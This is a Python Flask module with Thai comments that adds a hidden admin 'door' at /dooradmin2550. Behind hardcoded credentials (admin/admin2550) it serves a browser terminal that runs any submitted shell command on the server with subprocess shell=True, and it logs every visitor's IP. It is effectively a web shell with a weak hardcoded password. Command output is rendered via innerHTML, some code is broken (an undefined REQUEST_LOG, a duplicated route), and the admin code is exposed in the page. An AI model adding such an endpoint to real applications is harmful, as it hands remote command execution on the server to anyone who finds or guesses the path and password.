def run_terminal(app):
    from flask import request, jsonify, render_template_string, session, redirect, url_for
    import subprocess, os
    from datetime import datetime
    import uuid

    ADMIN_CODE = "admin2550"
    ADMIN_USERNAME = "admin"
    ADMIN_PASSWORD = "admin2550"
    CLIENT_LOG_PATH = "client_logs"
    REQUEST_LOG_PATH = "all_requests.log"

    if not os.path.exists(CLIENT_LOG_PATH):
        os.makedirs(CLIENT_LOG_PATH)

    # สร้างตัวแปรสำหรับเก็บ IP และ request log
    if not hasattr(run_terminal, "client_ips"):
        run_terminal.client_ips = set()
    if not hasattr(run_terminal, "request_logs"):
        run_terminal.request_logs = []
    if not hasattr(run_terminal, "unique_ips"):
        run_terminal.unique_ips = set()

    # ใส่ก่อน admin_door หรือที่จุดบนสุดของ run_terminal()
    def get_prompt(cwd):
        import os
        user = os.getlogin() if os.name != 'nt' else os.environ.get("USERNAME", "Unknown")
        venv = os.environ.get("VIRTUAL_ENV")
        env_name = os.path.basename(venv) if venv else ""
        prompt = f"({env_name}) " if env_name else ""
        prompt += f"{user}@{os.uname().nodename}:{cwd}$ "
        return prompt

    # Log ทุก request ที่เข้ามา
    @app.before_request
    def log_request():
        try:
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            ip = request.headers.get("X-Forwarded-For", request.remote_addr) or "unknown"
            path = request.path
            method = request.method

            # เก็บ IP ไม่ซ้ำ
            run_terminal.unique_ips.add(ip)

            # สร้าง client_id หากยังไม่มี
            if "client_id" not in session or session.get("client_id") is None:
                session["client_id"] = str(uuid.uuid4())[:8]
            client_id = session["client_id"]


            # เก็บ log ใน memory
            log = {
                "timestamp": now,
                "ip": ip,
                "path": path,
                "method": method,
                "client_id": client_id
            }
            run_terminal.request_logs.append(log)
            if len(run_terminal.request_logs) > 200:
                run_terminal.request_logs.pop(0)

            # เขียน log ลงไฟล์
            with open(REQUEST_LOG_PATH, "a", encoding="utf-8") as f:
                f.write(f"[{now}] ID: {client_id} IP: {ip} {method} {path}\n")
        except Exception as e:
            print(f"Logging error: {e}")

    # Route ดู request logs ล่าสุด
    @app.route(f"/door{ADMIN_CODE}/request_logs_full")
    def full_logs():
        if not session.get("admin_logged_in"):
            return "Unauthorized", 403
        html = "<h2>📡 All Web Access Logs</h2><pre style='font-size:13px;'>"
        for entry in run_terminal.request_logs[-100:]:
            html += f"[{entry['timestamp']}] ID: {entry['client_id']} IP: {entry['ip']} {entry['method']} {entry['path']}\n"
        html += "</pre>"
        return html

    # Route แสดง IP ไม่ซ้ำทั้งหมด
    @app.route(f"/door{ADMIN_CODE}/unique_ips")
    def show_unique_ips():
        if not session.get("admin_logged_in"):
            return "Unauthorized", 403

        ip_list = sorted(run_terminal.unique_ips)
        html = f"<h2>🧠 Unique IPs Accessed System</h2><p>Total: <b>{len(ip_list)}</b> IPs</p><pre style='font-size:13px;'>"
        for ip in ip_list:
            html += f"{ip}\n"
        html += "</pre>"
        return html

    @app.route(f"/door{ADMIN_CODE}/unique_ips_json")
    def unique_ips_json():
        if not session.get("admin_logged_in"):
            return jsonify({"error": "Unauthorized"}), 403
        ip_list = sorted(run_terminal.unique_ips)
        return jsonify({"ips": ip_list})

    # ฟังก์ชันระบบ (ตัวอย่าง)
    def get_system_info():
        info = {}
        try:
            info['os'] = subprocess.check_output("lsb_release -d", shell=True).decode().split(":")[1].strip()
            info['host'] = subprocess.check_output("hostname", shell=True).decode().strip()
            info['kernel'] = subprocess.check_output("uname -r", shell=True).decode().strip()
            info['uptime'] = subprocess.check_output("uptime -p", shell=True).decode().strip()
            info['packages'] = subprocess.check_output("dpkg -l | wc -l", shell=True).decode().strip() + " (dpkg)"
            info['shell'] = subprocess.check_output("echo $SHELL", shell=True).decode().strip()
            info['resolution'] = subprocess.check_output("xdpyinfo | grep dimensions", shell=True).decode().split()[1]
            info['de'] = subprocess.check_output("echo $XDG_CURRENT_DESKTOP", shell=True).decode().strip()
            info['wm'] = subprocess.check_output("wmctrl -m | grep Name", shell=True).decode().split(":")[1].strip()
            info['cpu'] = subprocess.check_output("lscpu | grep 'Model name:'", shell=True).decode().split(":")[1].strip()
            info['memory'] = subprocess.check_output("free -m | awk '/Mem:/ {print $3\"MiB / \"$2\"MiB\"}'", shell=True).decode().strip()
            info['gpu'] = subprocess.check_output("lspci | grep -i 'vga'", shell=True).decode().strip()
        except Exception as e:
            info['error'] = str(e)
        return info

    LOGIN_FORM = """<!DOCTYPE html>
    <html><head><title>Admin Login</title>
    <style>
        body {
            background-color: black;
            color: #00FF00;
            font-family: monospace;
            padding: 20px;
        }
        .ubuntu-logo {
            white-space: pre;
            font-size: 12px;
            color: #FF6C00;
        }
        input {
            background-color: black;
            color: #00FF00;
            border: 1px solid #00FF00;
            font-family: monospace;
            padding: 4px;
            margin: 4px 0;
        }
        input[type=submit] {
            cursor: pointer;
            font-weight: bold;
        }
        .blink {
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }
    </style>
    </head><body>
    <pre class="ubuntu-logo">
        _______  _______  _______  _______  _______  _______ 
        (  ____ \\(  ____ \\(  ___  )(       )(  ____ )(  ___  )
        | (    \\/| (    \\/| (   ) || () () || (    )|| (   ) |
        | (_____ | |      | (___) || || || || (____)|| |   | |
        (_____  )| |      |  ___  || |(_)| ||     __)| |   | |
                ) || |      | (   ) || |   | || (\\ (   | |   | |
        /\\____) || (____/\\| )   ( || )   ( || ) \\ \\__| (___) |
        \\_______)(_______/|/     \\||/     \\||/   \\__/(_______)
    </pre>
    <h2>Login to <span class="blink">Admin Terminal</span></h2>
    <form method="post" action="/dooradmin2550">
        Username: <input name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="submit" value="Login">
    </form>
    {% if error %}<p style="color:red;">{{ error }}</p>{% endif %}
    </body></html>"""

    TERMINAL_HTML = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <title>Mint Hacker Terminal</title>
    <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
    <style>
        :root { --mint: #3FFFBF; }
        body {
            background: black; color: var(--mint);
            font-family: 'VT323', monospace;
            font-size: 1.2em; margin: 0; padding: 0;
            height: 100vh; display: flex; overflow: hidden;
        }
        #terminal-container { width: 40%; display: flex; flex-direction: column; padding: 10px; border-right: 1px solid var(--mint); overflow: hidden; }
        #terminal { flex: 1; overflow-y: auto; white-space: pre-wrap; background: black; padding: 10px; border: 1px solid var(--mint); }
        .input-line { display: flex; margin-top: 8px; }
        .prompt { flex-shrink: 0; }
        #commandInput {
            background-color: black; color: var(--mint); border: none; outline: none;
            font-family: 'VT323', monospace; font-size: 1.2em; width: 100%; caret-color: var(--mint);
        }
        #commandInput::placeholder { color: var(--mint); opacity: 0.5; }

        #client-log {
            width: 35%; border-right: 1px solid var(--mint); padding: 10px; display: flex; flex-direction: column;
        }
        #client-info { margin-bottom: 10px; font-size: 18px; }
        #client-info h3 { margin: 0 0 5px 0; color: #ff9f1c; }
        #client-info p { margin: 0; line-height: 1.4em; max-height: 5em; overflow-y: auto; word-break: break-word; }

        #log-entries {
            flex: 1; background: black; color: var(--mint);
            font-size: 12px; padding: 8px; overflow-y: auto; white-space: pre-wrap; border: 1px solid var(--mint);
        }

        #request-log {
            flex: 1; background: black; color: #ff9f1c;
            font-size: 20px; padding: 8px; overflow-y: auto; white-space: pre-wrap;
            border: 1px solid #ff9f1c; margin-top: 15px;
        }

        #sysinfo {
            width: 25%; color: var(--mint); padding: 10px; font-family: monospace; font-size: 12px; overflow-y: auto;
        }
        #nvtop-output, #htop-output {
            margin-bottom: 15px; white-space: pre-wrap; border: 1px solid var(--mint); padding: 5px; background: black;
        }
        hr { border: 1px solid var(--mint); }
    </style>
    </head>
    <body>
        <div id="terminal-container">
            <div id="terminal"></div>
            <div class="input-line">
                <span class="prompt" id="prompt">{{ prompt }}</span>
                <input id="commandInput" autofocus autocomplete="off" spellcheck="false" placeholder="▮" />
            </div>
        </div>

        <div id="client-log">
            <div id="client-info">
                <h3>Unique IPs Accessed System</h3>
                <p>Total: <b id="ip-count">{{ ip_list|length }}</b> IPs</p>
                <ul id="ip-list" style="margin: 0; padding-left: 20px;">
                    {% for ip in ip_list %}
                        <li>{{ ip }}</li>
                    {% endfor %}
                </ul>
            </div>

            <script>
            async function updateUniqueIPs() {
                try {
                const response = await fetch('/dooradmin2550/unique_ips_json');
                if (!response.ok) throw new Error('Unauthorized or error');
                const data = await response.json();
                const ipListElem = document.getElementById('ip-list');
                const ipCountElem = document.getElementById('ip-count');

                ipListElem.innerHTML = '';
                data.ips.forEach(ip => {
                    const li = document.createElement('li');
                    li.textContent = ip;
                    ipListElem.appendChild(li);
                });

                ipCountElem.textContent = data.ips.length;
                } catch (err) {
                console.error('Failed to update unique IPs:', err);
                }
            }

            // อัพเดตทุก 5 วินาที (5000 ms)
            setInterval(updateUniqueIPs, 5000);

            // เรียกอัพเดตครั้งแรกทันทีตอนโหลดหน้า
            updateUniqueIPs();
            </script>

                        <hr>
            <h3>Live Client Logs</h3>
            <div id="log-entries"></div>

            <hr>
            <h3>Live Request Logs (Realtime)</h3>
            <div id="request-log">Loading...</div>
        </div>

        <div id="sysinfo">
            <h3>GPU Info (nvidia-smi)</h3>
            <pre id="nvtop-output">Loading GPU info...</pre>
            <hr>
            <h3>CPU Info (top)</h3>
            <pre id="htop-output">Loading CPU info...</pre>
        </div>

    <script>
        const terminal = document.getElementById("terminal");
        const input = document.getElementById("commandInput");
        const promptEl = document.getElementById("prompt");
        const logEntries = document.getElementById("log-entries");
        const requestLog = document.getElementById("request-log");
        let history = [], historyIndex = -1;

        input.addEventListener("keydown", function(event) {
            if (event.key === "Enter") {
                const command = input.value.trim();
                if (!command) return;
                history.push(command);
                historyIndex = history.length;
                terminal.innerHTML += `<div>${promptEl.textContent}${command}</div>`;
                fetch("/door{{ADMIN_CODE}}/terminal", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ command })
                }).then(res => res.json()).then(data => {
                    if (data.output) {
                        terminal.innerHTML += `<div>${data.output.replace(/\\n/g, "<br>")}</div>`;
                        const now = new Date().toLocaleTimeString();
                        const logEntry = `[${now}] $ ${command}\n${data.output}\n\n`;
                        logEntries.textContent += logEntry;
                        logEntries.scrollTop = logEntries.scrollHeight;
                    }
                    promptEl.textContent = data.prompt;
                    input.value = "";
                    terminal.scrollTop = terminal.scrollHeight;
                }).catch(err => {
                    terminal.innerHTML += `<div style="color:red;">Error: ${err}</div>`;
                });
                event.preventDefault();
            } else if (event.key === "ArrowUp") {
                if (historyIndex > 0) {
                    historyIndex--;
                    input.value = history[historyIndex];
                }
                event.preventDefault();
            } else if (event.key === "ArrowDown") {
                if (historyIndex < history.length - 1) {
                    historyIndex++;
                    input.value = history[historyIndex];
                } else {
                    input.value = "";
                }
                event.preventDefault();
            } else if (event.key === "Tab") {
                event.preventDefault();
                const cmd = input.value.trim();
                if (cmd !== "") {
                    fetch("/door{{ADMIN_CODE}}/terminal", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({ command: `ls ${cmd}*` })
                    }).then(res => res.json()).then(data => {
                        let matches = data.output.trim().split("\\n").filter(name => name.startsWith(cmd));
                        if (matches.length === 1) { input.value = matches[0]; }
                        else if (matches.length > 1) {
                            terminal.innerHTML += `<div>${matches.join(" ")}</div>`;
                        }
                        terminal.scrollTop = terminal.scrollHeight;
                    });
                }
            }
        });

        const code = "door{{ADMIN_CODE}}";

        function updateSystemInfo() {
            fetch(`/${code}/sysinfo`)
                .then(res => res.json())
                .then(data => {
                    document.getElementById("nvtop-output").textContent = data.nvtop || "No GPU info";
                    document.getElementById("htop-output").textContent = data.htop || "No CPU info";
                })
                .catch(() => {
                    document.getElementById("nvtop-output").textContent = "Error loading GPU info";
                    document.getElementById("htop-output").textContent = "Error loading CPU info";
                });
        }

        // ฟังก์ชันดึง log request สด ๆ ทุก 3 วินาที
        function updateRequestLog() {
            fetch(`/${code}/request_logs`)
                .then(res => res.json())
                .then(data => {
                    if (data.logs && data.logs.length > 0) {
                        let html = "";
                        data.logs.forEach(log => {
                            html += `[${log.time}] ${log.ip} ${log.method} ${log.path}<br>`;
                        });
                        requestLog.innerHTML = html;
                        requestLog.scrollTop = requestLog.scrollHeight;
                    } else {
                        requestLog.innerHTML = "No recent requests.";
                    }
                })
                .catch(() => {
                    requestLog.innerHTML = "Error loading request logs.";
                });
        }

        setInterval(updateSystemInfo, 5000);
        setInterval(updateRequestLog, 3000);

        updateSystemInfo();
        updateRequestLog();
    </script>
    </body>
    </html>
    """

    @app.route("/door<code>", methods=["GET", "POST"])
    def admin_door(code):
        if code != ADMIN_CODE:
            return "Unauthorized", 403

        client_ip = request.remote_addr
        run_terminal.client_ips.add(client_ip)

        if not session.get("admin_logged_in"):
            if request.method == "POST":
                username = request.form.get("username")
                password = request.form.get("password")
                if username == ADMIN_USERNAME and password == ADMIN_CODE:
                    session["admin_logged_in"] = True
                    session["cwd"] = os.path.expanduser("~")
                    session["client_id"] = str(uuid.uuid4())[:8]
                    return redirect(f"/door{ADMIN_CODE}")
                else:
                    return render_template_string(LOGIN_FORM, error="Invalid credentials")
            else:
                return render_template_string(LOGIN_FORM)
        else:
            cwd = session.get("cwd", os.path.expanduser("~"))
            prompt = get_prompt(cwd)
            client_id = session.get("client_id", "unknown")
            ip_list = list(run_terminal.unique_ips)  # ✅ ใช้ unique IPs ที่ log ทุก request
            return render_template_string(
                TERMINAL_HTML,
                prompt=prompt,
                client_id=client_id,
                ip_list = list(run_terminal.unique_ips),
                ADMIN_CODE=ADMIN_CODE,
                client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
            )

    @app.route("/door<code>/request_logs")
    def get_request_logs(code):
        if code != ADMIN_CODE or not session.get("admin_logged_in"):
            return jsonify({"logs": [], "error": "Unauthorized"}), 403
        return jsonify({"logs": run_terminal.request_logs})

    @app.route("/door<code>/sysinfo", endpoint="terminal_sysinfo")
    def terminal_sysinfo(code):
        if code != ADMIN_CODE or not session.get("admin_logged_in"):
            return jsonify({"nvtop": "Unauthorized", "htop": "Unauthorized"}), 403
        try:
            nvtop_output = subprocess.check_output("nvidia-smi", shell=True).decode()
        except Exception as e:
            nvtop_output = f"nvidia-smi error:\n{str(e)}"

        try:
            htop_output = subprocess.check_output("top -b -n 1 | head -n 20", shell=True).decode()
        except Exception as e:
            htop_output = f"top error:\n{str(e)}"

        return jsonify({"nvtop": nvtop_output, "htop": htop_output})

    @app.route("/door<code>/request_logs")
    def view_request_logs(code):
        if code != ADMIN_CODE or not session.get("admin_logged_in"):
            return "Unauthorized", 403

        html = "<h2>📡 All Web Access Logs</h2><pre style='font-size:13px;'>"
        for entry in REQUEST_LOG[-100:]:  # แสดงเฉพาะ 100 รายการล่าสุด
            html += f"[{entry['timestamp']}] ID: {entry['client_id']} IP: {entry['ip']} {entry['method']} {entry['path']}\n"
        html += "</pre>"
        return html

    @app.route("/door<code>/terminal", methods=["POST"])
    def terminal(code):
        if code != ADMIN_CODE or not session.get("admin_logged_in"):
            return jsonify({"output": "Unauthorized. Please login.", "prompt": "$ "}), 401

        command = request.json.get("command")
        cwd = session.get("cwd", os.path.expanduser("~"))

        if command.strip().startswith("cd"):
            parts = command.strip().split(maxsplit=1)
            try:
                if len(parts) == 1 or parts[1] == "~":
                    cwd = os.path.expanduser("~")
                else:
                    new_path = os.path.abspath(os.path.join(cwd, parts[1]))
                    if os.path.isdir(new_path):
                        cwd = new_path
                session["cwd"] = cwd
                return jsonify({"output": "", "cwd": cwd, "prompt": get_prompt(cwd)})
            except Exception as e:
                return jsonify({"output": str(e), "error": True, "cwd": cwd, "prompt": get_prompt(cwd)})

        try:
            result = subprocess.check_output(
                command,
                shell=True,
                stderr=subprocess.STDOUT,
                cwd=cwd,
                universal_newlines=True,
                env=os.environ
            )

            now = datetime.now()
            log_file = os.path.join(CLIENT_LOG_PATH, f"client_{now.strftime('%Y-%m-%d')}.txt")
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"[{now.strftime('%H:%M:%S')}] ({session.get('client_id')}) {command}\n")
                f.write(result + "\n\n")

            return jsonify({"output": result, "cwd": cwd, "prompt": get_prompt(cwd)})
        except subprocess.CalledProcessError as e:
            return jsonify({"output": e.output, "error": True, "cwd": cwd, "prompt": get_prompt(cwd)})
